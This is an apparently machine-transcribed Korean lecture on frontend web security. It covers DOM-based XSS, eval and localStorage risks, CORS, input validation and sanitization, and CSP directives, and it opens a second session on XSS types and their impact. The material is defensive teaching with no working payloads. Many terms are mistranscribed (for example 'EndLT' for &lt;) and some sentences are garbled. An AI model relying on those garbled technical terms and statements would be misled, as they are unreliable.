[7주차 1차시 03:32] 그리고 데이터를 화면에 깔끔하게 보여주는 것과 실시간 업데이트 기능도 프론트엔드가 담당해야 합니다.
[7주차 1차시 03:40] 차트를 그리거나 채팅 메시지를 실시간으로 업데이트하는 등의 상호작용을 구현하는 것을 말하는 것입니다.
[7주차 1차시 03:49] 최근에는 리액트, 뷰, 앵글러 같은 프레임워크를 통해 화면을 컴포넌트 단위로 관리하고 있으며 성능도 올라가고 유지 보수도 더욱 편리해지고 있습니다. [불명확 U0002]
[7주차 1차시 04:07] 다음은 프론트엔드가 사용자 입력을 처리할 땐 이벤트 리스너가 핵심 역할을 하는데요.
[7주차 1차시 04:15] OnChange나 OnInput과 같은 이벤트 리스너를 활용하면 사용자가 텍스트 필드를 수정할 때마다 실시간으로 값을 확인하고 특정 로직을 수행할 수 있습니다.
[7주차 1차시 04:28] 최근에는 React, Angular, Vue 같은 프레임에서 양방향 데이터 바인딩 기능을 제공하고 있습니다. [표현 차이 M0001]
[7주차 1차시 04:43] 사용자가 폼에 입력한 값이 컴포넌트 상태에 자동 반영되고 컴포넌트 상태 변경이 다시 화면으로 즉시 반영되고
[7주차 1차시 04:53] 이런 기능을 통해 개발자가 데이터 흐름을 좀 더 직관적으로 관리할 수 있습니다.
[7주차 1차시 04:59] 또한 프론트엔드 측에서 입력 데이터에 대한 유효성 검증을 수행하면 사용자 경험이 개선됩니다.
[7주차 1차시 05:07] 예를 들어 입력한 이메일 형식이 잘못되었을 때 서브로 전송해보지도 않은 상태이지만 즉시 에러 메시지를 보여주면서 수정의 기회를 줄 수 있죠.
[7주차 1차시 05:18] 가령 올바른 이메일 형식이 아닙니다. 이런 식으로.
[7주차 1차시 05:21] 하지만 그렇더라도 서브 측에서 다시 한번 검증하는 것은 반드시 필요한데요. [불명확 U0003]
[7주차 1차시 05:28] 여기 나와 있는 HTML5 내장 검증 기능은 별도의 코딩 없이 키워드를 지정하는 것만으로 웹브라우저가 유효성 검증을 해주는 기능입니다.
[7주차 1차시 05:40] 꼭 필요한 필드에는 리커이얼들을 명시해주고 정규식으로 입력 가능한 형태를 지정하는 패턴, 숫자나 일정 범위를 지정할 수 있는 민맥스 등 다양합니다. [불명확 U0004]
[7주차 1차시 05:57] 프론트엔드 개발자는 절대로 사용자 입력이 안전하다고 생각하면 안되겠죠.
[7주차 1차시 06:03] 예를 들어 XSS 공격의 대표적인 패턴은 사용자 입력에 스크립트를 삽입하는 것인데요.
[7주차 1차시 06:11] 이 값을 필터링 없이 클라이언트로 보내서 화면에 보여줘 버리면 악성 스크립트가 실행되어 보안사고가 발생할 수 있습니다.
[7주차 1차시 06:22] 이를 막기 위해서 DOM Purify 같은 라이브러리를 활용해 HTML 태그를 깨끗하게 삭제시키거나
[7주차 1차시 06:28] 위험한 숫자들을 EndLT, 꺽쇠기호 같은 것들을 지난 시간에 살펴봤었죠.
[7주차 1차시 06:39] EndLT, EndGT와 같은 HTML 엔티티로 변환해야 합니다.
[7주차 1차시 06:45] 당연히 평소에도 꾸준히 정적 분석을 하면서 개발 및 유지 보수가 이루어져야 하겠습니다.
[7주차 1차시 06:52] 아울러 서브로 전송하기 전에도 간단히 필터링 하거나
[7주차 1차시 06:57] 와이트리스트 기반의 검증을 수행하는 것이 좋습니다. [불명확 U0005]
[7주차 1차시 07:02] 또 데이터 전송에는 AJAX나 Fetch API를 사용하면서
[7주차 1차시 07:07] 꼭 HTTPS 암호화된 방식으로 전송하도록 권장하고 있습니다.
[7주차 1차시 07:13] 만약 처리 과정에서 오류가 발생한다면
[7주차 1차시 07:15] 사용자가 이해하기 쉽게 오류 발생을 알려주고
[7주차 1차시 07:18] 클라이언트 로깅 시스템이나 모니터링 툴을 연동 활용해 원인을 추적할 수 있도록 설계해 둬야 합니다.
[7주차 1차시 07:29] 그럼 전형적인 프론트엔드 처리 방식인 서버 사이드 렌더링 방식을 알아보도록 하겠습니다.
[7주차 1차시 07:37] 사용자가 특정 페이지를 요청하면 서버가 HTML 문서를 생성하는 과정에서 데이터 내용까지 함께 결합해서 완성하는 방식인데요.
[7주차 1차시 07:47] 그 결과 클라이언트가 응답받은 HTML 문서에 추가적인 데이터 작업 없이 즉시 렌더링, 즉 화면에 표출할 수 있게 됩니다.
[7주차 1차시 07:59] 만약 이처럼 게시판 페이지를 요청한다면 이를 요청받은 서버가 DB에서 게시글 목록을 읽고 이를 HTML 테이블 형태로 가공한 뒤 전송합니다.
[7주차 1차시 08:11] 클라이언트에서는 단순히 HTML의 내용대로 해석해서 보여주기만 하면 되기 때문에 초기 화면에 빠르게 뜨고 SEO라고 부르는 검색 엔진 최적화에도 유리합니다.
[7주차 1차시 08:25] 하지만 화면에 표시된 데이터 내용을 어떤 최신 내용으로 업데이트를 하려면 전체 페이지를 새로 고침하거나 서브로부터 다시 해당 영역의 HTML을 생성해서 받아와야 합니다.
[7주차 1차시 08:39] 따라서 동적 변화가 많은 경우에는 자바스크립트를 활용해 일부 영역만 업데이트를 하거나 다음 페이지에서 다룰 API 호출 방식을 사용하게 됩니다.
[7주차 1차시 08:56] 이번에는 CSR, 즉 클라이언트 사이드 렌더링 기반의 동적 데이터 처리에 대한 내용입니다.
[7주차 1차시 09:03] 최초 접속 시에는 기본 HTML 골격과 JavaScript 파일만 다운로드 받게 되며, 실제 표출할 데이터들은 JavaScript의 별도 API 호출을 통해 주고받는 구조입니다.
[7주차 1차시 09:18] 예를 들어 스타벅스 웹사이트의 경우 메뉴 목록이나 매장 위치 정보는 JavaScript 코드가 관련 API를 호출해 받아온 뒤 화면에 동적으로 삽입한 것입니다.
[7주차 1차시 09:33] 이렇게 하면 페이지 전환 없이 일부 영역만 업데이트 할 수 있기 때문에 사용자 만족도가 높아집니다.
[7주차 1차시 09:40] 하지만 로딩 시에 스크립트 파일이 많거나 크기가 크다면 처리가 늦어져 첫 화면이 늦게 나타나는 문제가 생길 수 있습니다.
[7주차 1차시 09:51] 또한 검색 엔진이 웹페이지 내용들을 크롤링해서 가져갈 때 동쪽으로 반영된 데이터가 빠진 페이지 내용만 가져간다면 [불명확 U0006]
[7주차 1차시 10:00] 검색 엔진 입장에서는 완전하지 않은 페이지가 서비스되고 있는 것으로 잘못 인식할 수도 있습니다.
[7주차 1차시 10:08] 그래서 요즘에는 SSR과 CSR을 혼합하는 전략도 순이 쓰이고 있습니다. [불명확 U0007]
[7주차 1차시 10:18] 그럼 이어서 프론트엔드에서 발생할 수 있는 보안 이슈에 대해 알아보도록 하겠습니다.
[7주차 1차시 10:27] 제일 먼저 이야기할 DOM 기반 보안 문제는
[7주차 1차시 10:30] 여기서 DOM은 Document Object Model의 약어입니다.
[7주차 1차시 10:35] 그래서 아무튼 CSR, 즉 서버가 아닌 클라이언트 측에서
[7주차 1차시 10:40] DOM을 동적으로 변경할 때 발생하는 문제인데요.
[7주차 1차시 10:44] 파싱된 HTML을 화면에 표출하는 과정에서
[7주차 1차시 10:48] HTML 문서 내용을 웹브라우저 메모리 상의 DOM 구조로 보관하게 되는데, 이 메모리 속 DOM 구조를 변경하면 그 즉시 화면에도 반영이 됩니다.
[7주차 1차시 11:01] 전통적인 크로스사이트 스크립트 취약점은 서버에서 악성 스크립트가 포함된 HTML이 생성되어 사용자에게 주입되는 것인 반면에
[7주차 1차시 11:11] 동기반 크로스사이트 스크립트는 자바스크립트 로직 안에서 document.location 등을 활용하여 변조한 뒤 [불명확 U0008]
[7주차 1차시 11:20] innerHTML 등을 통해 반영하는 식으로 스크립트를 주입하는 방식입니다.
[7주차 1차시 11:25] 이 경우 서버 로그에는 악성 스크립트가 전혀 남지 않기 때문에
[7주차 1차시 11:31] 추적이 더 어려울 수 있습니다.
[7주차 1차시 11:37] DOM 기반 보안 문제는 취약한 DOM 조작 함수를 사용하거나
[7주차 1차시 11:41] 입력 검증에 허점이 있을 경우
[7주차 1차시 11:43] 클라이언트에서 직접 동적 컨텐츠를 생성하는 상황에서 발생할 수 있습니다.
[7주차 1차시 11:50] 예시 중 하나인 innerHTML의 경우
[7주차 1차시 11:53] 문자열을 그대로 HTML로 해석하는 기능이 있으므로
[7주차 1차시 11:56] 스크립트 태그나 이벤트 핸들러를 직접 주입할 수 있습니다.
[7주차 1차시 12:03] URL 파라미터나 해시의 내용을 가져와서 그대로 DOM에 반영하도록 구현했다면
[7주차 1차시 12:09] 매우 간단히 크로사이트 스크립트 취약점이 발생합니다.
[7주차 1차시 12:15] 다음으로 자바스크립트는 브라우저 안에서 동작하기 때문에
[7주차 1차시 12:20] 외부 리소스를 추가적으로 불러오거나 이벨 같은 함수로 문자열로 변수에 담겨져 있는 자바스크립트 코드를 다시 실행을 할 수가 있는데요. [불명확 U0009]
[7주차 1차시 12:33] 이벨 함수라는 거, 스펠링 EVAL 이거 얘기하는 겁니다. [불명확 U0010]
[7주차 1차시 12:40] 이는 개발 편의성을 높일 수는 있으나 보안 위험을 유발할 수 있는데요.
[7주차 1차시 12:46] 공격자가 조작한 문자열이 들어간 상태로 이 이벨 함수가 호출된다면 심각한 크루사이트 스크립팅 공격이나 데이터 유출이 일어날 수 있습니다. [불명확 U0011]
[7주차 1차시 12:56] 또한 전역 객체인 글로벌 객체인 윈도우나 도큐먼트에 함부로 프로퍼티를 추가하면 다른 스크립트와 충돌하거나 프로토타입 체인이 악용당할 수 있습니다.
[7주차 1차시 13:16] 그리고 공격자가 문자열 변환하는 메소드를 악성코드로 오버라이딩을 하게 되면
[7주차 1차시 13:23] 라이브러리 내부 로직이 오작동하게 되거나 민감한 정보를 유출할 수 있습니다.
[7주차 1차시 13:30] 광고나 분석을 위해 서드파티가 공급한 스크립트를 임포트해서 사용하더라도
[7주차 1차시 13:35] 악성코드로 변조될 위험이 있다는 것을 기억하고
[7주차 1차시 13:40] 반드시 신뢰할 수 있는 경로로 받아오는지 확인해야 합니다.
[7주차 1차시 13:46] 로컬 저장소는 사용자 설정이나 임시 데이터를 클라이언트 측에 저장해 둘 수 있는 편리한 기능입니다
[7주차 1차시 13:57] 클라이언트의 사용 환경에서 기억해 두면 편리한 정보들
[7주차 1차시 14:01] 예를 들어 웹앱에서 테마 작성을 저장하거나 장바구니 내용 등을 로컬, 즉 사용하고 있는 컴퓨터에 저장할 수 있는데요
[7주차 1차시 14:11] 로컬 저장소는 보관하는 기간에 따라 영구적으로 저장하여 사용할 수 있는
[7주차 1차시 14:17] 로컬 스토리지와 세션이 유지되는 동안 저장되는 세션 스토리지로 분류됩니다
[7주차 1차시 14:24] 아무래도 서버와 매번 통신하지 않고 정보를 가져올 수 있어서
[7주차 1차시 14:30] 빠르고 간편하다는 것이 큰 장점입니다
[7주차 1차시 14:40] 로컬 저장소가 가장 취약해지는 순간은 크로스 사이트 스크립팅 공격이 성공했을 때입니다.
[7주차 1차시 14:46] 토큰이나 비밀번호 등 민감 정보를 평문에 넣어뒀다면,
[7주차 1차시 14:51] localstorage.getitem 같은 코드로 손쉽게 민감 정보를 빼낼 수 있습니다.
[7주차 1차시 14:59] 또한 로컬 저장소에 저장된 데이터를 공격자가 임의로 변경할 수 있으므로 무결성을 훼손할 수도 있습니다.
[7주차 1차시 15:08] 예컨대 쇼핑몰에서 로컬 저장소에 할인 쿠폰 정보를 넣어뒀다면 공격자가 마음대로 가격이나 수량 등의 수치를 바꿔서 결제 로직을 속일 수도 있을 겁니다.
[7주차 1차시 15:21] 기본적으로 Same Origin Policy가 적용되어 있으므로 다른 도메인의 코드에서는 접근할 수 없게 차단되겠지만 서브 도메인이나 같은 도메인의 다른 경로의 페이지에는 여전히 로컬 저장소를 공유할 수 있으므로 설계할 때 매우 주의해야 합니다.
[7주차 1차시 15:46] API 호출 방식은 프론트엔드가 동적으로 서브 데이터를 주고받는 핵심 통신 수단입니다.
[7주차 1차시 15:54] 사용자가 프론트엔드 딴의 애플리케이션을 사용하는 동안 API를 그때그때 호출하면서 화면 구성에 필요한 데이터를 갱신하게 됩니다.
[7주차 1차시 16:04] 아울러 사용자가 선택하거나 업로드한 정보 역시 API를 통해 즉시 서버로 전달될 수 있습니다.
[7주차 1차시 16:12] 이 과정에서 보완적으로 취약해질 수 있는 부분 4가지가 아래쪽에 나열되어 있는데요. [불명확 U0012]
[7주차 1차시 16:20] 아래쪽은 이렇게 4가지가 나와있고, 뒤에서 좀 더 자세히 알아보도록 하겠습니다.
[7주차 1차시 16:33] 앞서 살펴본 4가지 API 호출에서 발생할 수 있는 취약점을 구체적으로 정리해보았는데요.
[7주차 1차시 16:42] 우선 민감 데이터가 노출될 수 있는 위험에 대한 내용입니다.
[7주차 1차시 16:47] 일부 개발자가 데이터를 추려내는 것이 귀찮고 쉽게 개발하려고 하다 보니
[7주차 1차시 16:52] 포함될 필요가 없는 사용자 비밀번호나 주민등록번호를 API 응답과 응답에 함께 담아 보내는 경우가 발생합니다.
[7주차 1차시 17:02] 이는 큰 사고로 이어질 수 있으므로 꼭 마스킹 처리하거나 제외시켜야 합니다.
[7주차 1차시 17:06] 특히 URL 쿼리 스트리밍에 민감 정보를 포함시키면 통신에 관여되는 네트워크 장비의 로그, 브라우저 기록 또는 로그나 캐시 등에 남게 되어 쉽게 탈취될 수 있으므로 민감 정보는 본문 내에서 적절한 안보 코어화를 통해 전달해야 합니다.
[7주차 1차시 17:27] 다음으로는 네트워크 통신 취약점입니다.
[7주차 1차시 17:29] 보호되지 않는 HTTP 통신으로는 민감한 정보를 절대 주고받으면 안되고, HTTPS를 사용하더라도 설정을 잘못하여 중간자 공격에 노출되거나, 인증서가 만료된 채 그대로 방치해 두었을 경우 공격자가 트래픽을 훔쳐볼 수도 있습니다.
[7주차 1차시 17:49] 다음으로는 인증 및 권한 관리 취약점에 대한 내용입니다.
[7주차 1차시 17:53] 만약 잘못 구현하여 세션 토큰이 만료되어야 할 시점에도 제대로 만료되지 않거나 사용자 권한을 정확하게 검증하지 않을 경우 다른 계정 정보를 줘야 한다거나 허용되지 않은 권한을 행사할 수 있는 문제가 발생할 수 있다는 것을 꼭 유념하여야 합니다. [불명확 U0013]
[7주차 1차시 18:15] 마지막으로 CORS, Cross Origin Resource Sharing 이라는 것이 있는데요.
[7주차 1차시 18:23] 웹브라우저에서 서로 다른 출척끼리 요청하는 것을 어떻게 제어할지 서버에서 지정해주는 정책입니다
[7주차 1차시 18:33] 그래서 브라우저에서 API 서버 쪽으로 CORS 요청을 보내면
[7주차 1차시 18:39] API 서버에서 그 응답으로 허용 정책을 보내주게 되는데요
[7주차 1차시 18:43] 이 내용에 따라 브라우저가 서로 다른 출처에서 상호 리소스를 공유할지 말지를 결정하여 동작하게 됩니다
[7주차 1차시 18:52] 그런데 만약 API 서버에서 아무 도메인이나 허용하도록 응답을 주게 설정되어 있다면
[7주차 1차시 18:59] 악성 웹사이트에서 임의의 요청을 보낼 수 있습니다
[7주차 1차시 19:03] 반드시 필요한 도메인만 지정해둬야 안전하겠죠
[7주차 1차시 19:11] 그러면 마지막으로 이번에는 프론트엔드에서 어떻게 시켜 코딩을 하게 되는지 알아보도록 하겠습니다. [불명확 U0014]
[7주차 1차시 19:25] 첫 번째로 사용자 입력 값에 대한 검증과 필터링에 대해 가장 많이 신경 써야 하는 것이 프론트엔드인데요.
[7주차 1차시 19:34] 입력 필드에 어떤 값들이 들어왔을 때 이를 제대로 검증하고 필터링하지 못하면 다양한 공격이 발생할 수 있기 때문입니다.
[7주차 1차시 19:44] 여기에서 검증이라고 말하는 것은 이 값이 숫자 범위 안에 있는가 또는 의도와 전혀 다른 값인가를 체크하는 것을 얘기를 하고요. [불명확 U0015]
[7주차 1차시 20:00] 위험한 문자를 제거하거나 HTML 엔티티로 변환하는 과정을 필터링이라고 합니다.
[7주차 1차시 20:18] 우리는 이 필터링이라는 용어에 익숙하지만 걸러내는 것 뿐만 아니라 안전하게 처리될 수 있도록 변환시키는 것까지 포함시켜 볼 때
[7주차 1차시 20:28] 영어 표현으로는 필터링 보다는 Sanitization 이런 식으로
[7주차 1차시 20:35] 즉 정화시키는 과정 또는 안전하게 변환하는 과정 정도의 단어를 사용하고 있습니다.
[7주차 1차시 20:44] 1차적으로 프론트엔드에서 걸러내주면 사용자 차원에서 보안이 개선되고
[7주차 1차시 20:49] 공격도 방어할 수 있겠지만 반복적으로 이야기했듯
[7주차 1차시 20:53] 프론트엔드를 흉내내어 서버를 곧바로 공격하는 것도 고려해보면
[7주차 1차시 20:58] 서버에서도 이중으로 체크를 해줘야 합니다.
[7주차 1차시 21:05] 이번에는 검증과 필터링을 어떤 식으로 구현하게 되는지
[7주차 1차시 21:09] 구체적으로 살펴보도록 하겠습니다.
[7주차 1차시 21:13] 우선 앞서 설명했던 HTML5의 기본 검증 기능을 활용하는 방법인데요.
[7주차 1차시 21:19] 인풋 같은 입력창 태그에 적용할 수 있는 다양한 검증 속성들을 활용하는 것입니다.
[7주차 1차시 21:26] 입력창의 속성에 이메일 타입으로 지정을 해두면 브라우저가 이메일 형식만 입력할 수 있도록 가이드해주는 기능 같은 것을 얘기하는 것이고요.
[7주차 1차시 21:37] 그리고 대부분의 경우에는 직접 자바스크립트를 이용해 검증하는 로직을 만들어야 합니다.
[7주차 1차시 21:43] 예를 들어 온서브 및 이벤트에서 서브로 전송하기 전 입력된 내용들을 체크해서
[7주차 1차시 21:49] 규칙에 맞지 않는 경우 전송을 취소하고 에러 메시지를 표시하도록 구현합니다.
[7주차 1차시 21:56] 또한 관련 전문 라이브러리를 활용하는 방법도 있는데요.
[7주차 1차시 22:01] DOM-Purify 같은 라이브러리를 사용하면 위험한 특수기호 태그들을 안전한 텍스트로 치환해주기 때문에 크롭사이트 스크립팅을 예방해줍니다.
[7주차 1차시 22:21] 모든 케이스를 직접 정규식으로 커버하기는 어려울 때 특히 유용한 기능입니다.
[7주차 1차시 22:25] 아울러 프론트엔드 프레임워크에서도 이에 대한 지원 기능이 있기 때문에 어떤 기능을 제공하는지 확인하고 적극 활용하면 좋습니다.
[7주차 1차시 22:39] 추가적으로 알아둬야 하는 내용들을 한번 빠르게 보겠습니다.
[7주차 1차시 22:44] 우선 화이트리스트라 부르는 최소 허용 정책 방식을 적용해서 가장 정확하게 요건에 맞는 입력만 받아들이도록 구현하는 것이 바람직합니다.
[7주차 1차시 22:55] 예를 들어 나이를 입력받는 필드는 숫자만 허용하고
[7주차 1차시 22:59] 이메일에는 적합한 패턴만 허용하고
[7주차 1차시 23:05] 허용되는 값만 남기고 나머지는 모두 거부하는 방식을 얘기를 합니다.
[7주차 1차시 23:11] 그리고 입력 값은 출력하기 전에 HTML 엔티티 인코딩으로 이스케이프 처리하여
[7주차 1차시 23:19] 크로스 사이트 스크립팅을 예방해야 합니다.
[7주차 1차시 23:25] 물론 서버와 클라이언트 모두 일관되게 적용되어야 프론트핸드를 우회한 공격으로부터 방어를 할 수가 있습니다.
[7주차 1차시 23:33] 그래서 이중 방어가 필요하고 실제 운영 중에는 정적 분석 도구나 자동화된 보안 스캐너를 CICD 파이프라인에 적용해서 시약점이 없는지 주기적으로 확인해야 합니다.
[7주차 1차시 23:51] 그리고 CSP, CSP는 컨텐츠 시큐리티 폴리쉬의 약자로 크로스 사이트 스크립팅 공격을 방지하기 위해 브라우저가 외부 리소스 로딩을 통제하도록 하는 보안 정책을 말합니다. [불명확 U0016]
[7주차 1차시 24:05] CSP를 적용하게 되면 웹 브라우저가 스크립트, 스타일, 이미지 등을 특정 도메인에서만 로드할 수 있도록 강제합니다.
[7주차 1차시 24:15] CSP는 서버의 HTTP 응답 헤더에 메타 태그로 전달되는데요. [불명확 U0017]
[7주차 1차시 24:21] 브라우저가 이 내용을 해석하여 선제적으로 통제하면서 동작합니다.
[7주차 1차시 24:30] 점점 많은 사이트들이 CSP를 도입하여 공격 표면을 축소하고 있습니다.
[7주차 1차시 24:41] 이번에는 CSP 지시문이 어떻게 구성되어 있는지 한번 살펴보도록 하겠습니다.
[7주차 1차시 24:47] CSP는 HTTP 응답 헤더 또는 메타 태그에서
[7주차 1차시 24:51] 컨텐츠 시큐리티 폴리시라는 이름으로 지정이 되어 있습니다.
[7주차 1차시 24:56] 이 속성으로 지정하게 되며
[7주차 1차시 25:02] 정책 내용을 하나의 문자열 안에 세미콜론으로 구분하여 지정하는 것이 가능합니다.
[7주차 1차시 25:09] 예를 들어 첫 번째 이 예시는
[7주차 1차시 25:11] 기본적으로는 셀프, 즉 현재 로딩된 곳과 같은 곳에만
[7주차 1차시 25:19] 리소스를 사용할 수가 있고 [표현 차이 M0002]
[7주차 1차시 25:21] 스크립트 소스 지시문을 추가해서
[7주차 1차시 25:24] 스크립트 로딩이 가능한 믿을 수 있는 도메인으로
[7주차 1차시 25:37] trusted.cdn.com을 셀프와 함께 지정을 하고 있습니다. [불명확 U0018]
[7주차 1차시 25:46] 맨 끝부분에 있는 오브젝트 소스 지시문은
[7주차 1차시 25:51] 오브젝트 태그나 인베디드 모 등 [불명확 U0019]
[7주차 1차시 25:54] 플러그인 콘텐츠를 로드할 수 있는 곳을 명시하는 것인데요.
[7주차 1차시 25:59] 아무것도 허용하지 않도록 non을 지정하고 있습니다. [불명확 U0020]
[7주차 1차시 26:05] 여기 주요 지시문으로 나와 있는 것 말고도 더 다양한 지시문이 있으며 가급적 최대한 보수적으로 설정하는 것이 좋습니다.
[7주차 1차시 26:13] 마지막에 있는 메타태그를 사용한 예시는 보조적으로 가능하다는 것일 뿐이고 권장하는 방식은 HTTP 헤더로 지정하는 방식입니다.
[7주차 1차시 26:29] 그럼 7주차 1차시 내용 요약 정리해 보도록 하겠습니다.
[7주차 1차시 26:37] 프론트엔드는 사용자 입력을 주고 받으면서 UI를 동적으로 갱신하는 역할을 한다.
[7주차 1차시 26:44] 여기에는 DOM 저장, 로컬 저장소, CORS 설정 등 다양한 보안 이슈가 있기 때문에 [불명확 U0021]
[7주차 1차시 26:51] 자바스크립트 실행 환경의 취약점을 인식을 해야 한다.
[7주차 1차시 26:56] 또 반드시 입력값은 검증하고 필터링 혹은 센이타이제이션에서 악의적인 코드 삽입을 차단해야 하고 [불명확 U0022]
[7주차 1차시 27:04] 서버 측에서도 반드시 재검증을 해주는 이중 보안 구조를 갖춰야 합니다.
[7주차 1차시 27:11] 그리고 마지막으로 CSP를 활용하면 프로사이트 스크립팅 및 인젝션 공격을 완화할 수 있으며 [불명확 U0023]
[7주차 1차시 27:18] 코드 리뷰와 CICD 파이프라인을 통한 보안 테스트를 통해서
[7주차 1차시 27:24] 취약점을 조기에 자동으로 발견하고 수정할 수 있도록
[7주차 1차시 27:28] 프레임워크를 갖춰야 하겠습니다.
[7주차 1차시 27:35] 참고문원이고요. [불명확 U0024]
[7주차 1차시 27:38] 1차시 수업은 여기까지 하도록 하겠습니다.
[7주차 1차시 27:41] 감사합니다.
[7주차 1차시 27:42] [무음]

# [3-TRANSCRIPT] 7주차 2차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · Reflected XSS/반사형 XSS/리플렉티드 · Stored XSS/저장형 XSS/스토어드 · DOM XSS/DOM 기반 XSS/돔 기반/document.write/innerHTML · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · 화이트리스트/Whitelist/최소 허용/허용 목록 · Authentication/인증/로그인 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링

[7주차 2차시 00:00] 7주차 2차시 강의 시작하도록 하겠습니다. [불명확 U0001]
[7주차 2차시 00:10] 이번 차시에 학습할 내용은 크로스사이트 스크립팅 치약점 진단 및 대응입니다. [불명확 U0002]
[7주차 2차시 00:18] 총 3가지 주제로 나눠서 차례대로 한번 살펴보도록 하겠습니다.
[7주차 2차시 00:27] 우선 학습 목표입니다. 크로스 사이트 스크립팅 개념과 유형을 이해하고 실제 공격기법과 취약점 진단 방법을 한번 알아보도록 하겠습니다.
[7주차 2차시 00:40] 그리고 이를 방어하기 위한 기법에 대해서도 학습 한번 해보도록 하겠습니다.
[7주차 2차시 00:50] 일단은 학습 내용은 크로스 사이트 스크립팅의 이해와 진단 방어 방법입니다. [불명확 U0003]
[7주차 2차시 00:57] 그럼 크로스사이트 스크립팅 취약점부터 이해부터 한번 시작해 보도록 하겠습니다. [불명확 U0004]
[7주차 2차시 01:14] 크로스사이트 스크립팅의 개념과 발생 원인 살펴보면, 크로스사이트 스크립팅은 웹 애플리케이션이 사용자 입력을 제대로 검증하지 않고 HTML에 그대로 반영해 화면에 보여줄 때 발생합니다.
[7주차 2차시 01:29] 이 틈을 이용해 공격자가 스크립트 태그나 이벤트 핸들러를 삽입하면 브라우저가 이를 실행하면서 쿠키나 세션을 탈취하거나 돔 구조를 조작해 피싱 페이지로 유도하는 등 심각한 공격이 가능합니다.
[7주차 2차시 01:47] 이런 취약점은 보통 세 가지 경로로 발생을 하는데요.
[7주차 2차시 01:50] 첫째, 사용자 입력을 그대로 화면에 출력하는 경우, 둘째, 데이터베이스에 저장된 악성 데이터가 다시 출력되는 경우, 셋째, DOM 조작을 통해 악성 코드가 삽입되는 경우입니다.
[7주차 2차시 02:07] 앞서 간단히 언급하긴 했지만, 이번에는 전형적인 크로스사이트 스크립팅 공격 흐름을 세 단계로 나눠서 보도록 하겠습니다.
[7주차 2차시 02:24] 먼저 첫 번째 단계에서는 공격자가 게시글 작성이나 URL 파라미터 조작, 댓글 작성 같은 경우에 악성 스크립트를 주입합니다.
[7주차 2차시 02:35] 그리고 두 번째 단계에서는 웹 애플리케이션이 이를 제대로 거르지 못하고 화면에 바로 반영하거나 DB에 저장해버리는 경우가 있습니다.
[7주차 2차시 02:47] 마지막 세 번째 단계에서는 피해 사용자가 해당 페이지를 조회하는 순간 악성 스크립트가 실행되면서 공격이 성공하게 됩니다.
[7주차 2차시 02:57] 이런 흐름을 정확하게 이해하고 있어야 어느 지점에서 어떻게 방어해야 할지 명확하게 판단을 할 수가 있겠죠.
[7주차 2차시 03:09] 다음으로 크로스사이트 스크립팅은 크게 세 가지 유형으로 나누어서 설명을 할 수가 있습니다.
[7주차 2차시 03:15] 첫 번째는 Reflected Cross-Site Scripting인데요.
[7주차 2차시 03:20] 이 유형은 사용자의 입력이 화면에 즉시 반영되는 곳에서 악용되는 일회성 공격입니다.
[7주차 2차시 03:26] 예를 들어 검색 페이지에서 검색어를 전달받는 Q 파라미터 값이 그대로 화면에 표시되어 있다면 공격자는 이 파라미터에 악성 스크립트 문장을 삽입한 URL을 만들어 사용자에게 전송하고 클릭을 유도합니다. [불명확 U0005]
[7주차 2차시 03:45] 사용자가 아무 생각 없이 해당 링크를 누르면 브라우저는 악성 스크립트를 실행하게 되고 쿠키 정보나 입력된 값들이 공격자에게 유출될 수가 있습니다.
[7주차 2차시 03:59] 둘째는 스토어드 크로스 사이트 스크립팅입니다.
[7주차 2차시 04:02] 이 방식은 사용자가 입력한 값이 DB에 저장된 후 다른 사용자들이 그 내용을 볼 때마다 반복적으로 공격이 이루어지는 지속적인 방법입니다.
[7주차 2차시 04:17] 예를 들어 게시판이나 댓글 기능처럼 누군가가 입력한 내용을 다수가 조회할 수 있는 기능이 만약에 있다면
[7주차 2차시 04:25] 그리고 공격자가 거기에 악성 스크립트를 심을 수 있다면
[7주차 2차시 04:28] 공격자가 악성 스크립트가 포함된 글을 작성을 하고
[7주차 2차시 04:34] 누군가가 그 글을 볼 때마다 해당 스크립트가 지속적으로 실행되어 피해가 반복됩니다.
[7주차 2차시 04:42] 이처럼 악성 콘텐츠가 저장된 형태로 공격이 반복되는 방식을 스토어드 크로스사이트 스크립팅이라고 합니다.
[7주차 2차시 04:50] 세 번째, DOM 기반 크로스사이트 스크립팅은 앞서 프론트엔드 데이터 처리 설명 과정에서 설명한 적이 있었는데요.
[7주차 2차시 04:59] 이 방식은 서버가 아니라 클라이언트 쪽 자바스크립트 로직을 악용하는 형태입니다.
[7주차 2차시 05:06] 예를 들어 URL 뒤에 해시 값을 location.hash로 읽어와 DOM을 조작해서 화면에 표시하는 방식으로 개발되어 있다면
[7주차 2차시 05:18] 공격자는 이 부분에 악성 스크립트를 넣어서 브라우저에서 직접 실행되도록 유도를 할 수가 있습니다.
[7주차 2차시 05:27] 동기반 크로스사이트 스크립팅은 서버에는 기록이 남지 않기 때문에 [불명확 U0006]
[7주차 2차시 05:31] 탐지와 방어가 가장 어려운 방식이며
[7주차 2차시 05:35] 프론트핸드 프레임워크를 사용하더라도 적절한 방어 로직을 반드시 고려해야 합니다. [불명확 U0007]
[7주차 2차시 05:47] 다음으로는 크로스사이트 스크립팅 공격으로 인해 발생할 수 있는 주요 피해를 정리해보도록 하겠습니다.
[7주차 2차시 05:55] 크로스사이트 스크립팅은 단순히 팝업을 띄우는 장난 수준이 아니라
[7주차 2차시 06:00] 세션 쿠키나 계정 정보를 훔쳐서 로그인 상태를 탈취할 수도 있습니다.
[7주차 2차시 06:07] 이로 인해 금융사기나 무단결제 같은 심각한 피해로도 이어질 수 있고 [불명확 U0008]
[7주차 2차시 06:14] 또한 사용자의 브라우저를 조작하거나 내부망 스캐닝을 시도해서 기업 내부 정보를 유출되는데 악용되기도 합니다. [불명확 U0009]
